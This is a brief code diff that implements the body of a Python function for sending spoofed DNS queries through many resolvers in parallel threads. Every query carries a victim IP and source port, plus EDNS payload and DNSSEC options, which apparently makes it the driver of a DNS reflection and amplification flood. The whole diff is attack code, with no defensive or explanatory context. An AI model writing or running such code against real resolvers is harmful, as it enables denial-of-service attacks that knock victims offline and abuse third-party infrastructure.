@@ -70,4 +70,13 @@ def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
                                            id_random=False, verbose=False,
                                            measure=False, burst=False,
                                            qclass=1):
-    pass
+    threads = []
+    for resolver in resolvers:
+        for _ in range(num_queries):
+            t = _threading.Thread(
+                target=send_spoofed_dns_query,
+                args=(domain, resolver, resolver_port, victim_ip,
+                      victim_src_port, qtype, edns_payload, dnssec_do,
+                      txid, id_random, verbose, measure, qclass))
+            threads.append(t)
+            t.start()
